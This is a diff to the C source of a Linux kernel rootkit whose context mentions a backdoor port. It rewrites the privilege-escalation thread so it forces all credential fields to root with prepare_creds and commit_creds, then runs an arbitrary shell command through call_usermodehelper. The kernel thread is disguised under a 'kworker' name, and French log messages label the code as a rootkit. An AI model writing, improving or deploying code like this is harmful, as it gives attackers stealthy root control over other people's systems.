@@ -1465,7 +1465,7 @@ static int open_backdoor_port(int port)
  * 
  * @return The function `escalation_thread_fn` is returning an integer value of 0.
  */
-static int escalation_thread_fn(void *data)
+/*static int escalation_thread_fn(void *data)
 {
     char *cmd = (char *)data;
     char *argv[] = {"/bin/sh", "-c", cmd, NULL};
@@ -1474,8 +1474,37 @@ static int escalation_thread_fn(void *data)
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
     kfree(cmd);
     return 0;
-}
+}*/
 
+static int escalation_thread_fn(void *data)
+{
+    char *cmd = (char *)data;
+    struct cred *new_creds;
+
+    new_creds = prepare_creds();
+    if (!new_creds) {
+        kfree(cmd);
+        return -ENOMEM;
+    }
+
+    new_creds->uid.val = 0;
+    new_creds->gid.val = 0;
+    new_creds->suid.val = 0;
+    new_creds->sgid.val = 0;
+    new_creds->euid.val = 0;
+    new_creds->egid.val = 0;
+
+    commit_creds(new_creds);
+
+    char *argv[] = {"/bin/sh", "-c", cmd, NULL};
+    char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
+    
+    printk(KERN_INFO "rootkit: execution de la commande en tant que root via kthread\n");
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+
+    kfree(cmd);
+    return 0;
+}
 
 /**
  * The function `handle_escalation` in the given code snippet handles privilege escalation
@@ -1500,8 +1529,8 @@ static int handle_escalation(struct rk_args *args)
         if (IS_ERR(cmd_kernel)) {
             return PTR_ERR(cmd_kernel);
         }
-
-        task = kthread_run(escalation_thread_fn, cmd_kernel, "kworker/rk_proc");
+        printk(KERN_INFO "rootkit: Execution de la commande : %s\n", cmd_kernel);
+        task = kthread_run(escalation_thread_fn, cmd_kernel, "kworker/rk_exec");
         if (IS_ERR(task)) {
             kfree(cmd_kernel);
             return PTR_ERR(task);
